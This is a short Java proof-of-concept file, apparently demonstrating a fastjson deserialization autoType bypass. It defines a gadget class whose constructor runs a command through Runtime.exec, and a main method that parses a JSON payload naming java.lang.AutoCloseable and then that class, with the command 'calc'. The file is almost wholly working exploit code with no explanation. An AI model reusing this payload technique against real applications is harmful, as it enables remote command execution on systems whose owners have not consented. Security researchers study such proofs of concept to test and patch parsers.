package com.github.enokiy;

import com.alibaba.fastjson.JSON;

public class VulAutoCloseable implements AutoCloseable {
    public VulAutoCloseable(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void close() throws Exception {

    }

    public static void main(String[] args) {
        String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.github.enokiy.VulAutoCloseable\",\"cmd\":\"calc\"}";
        JSON.parse(poc);
    }
}
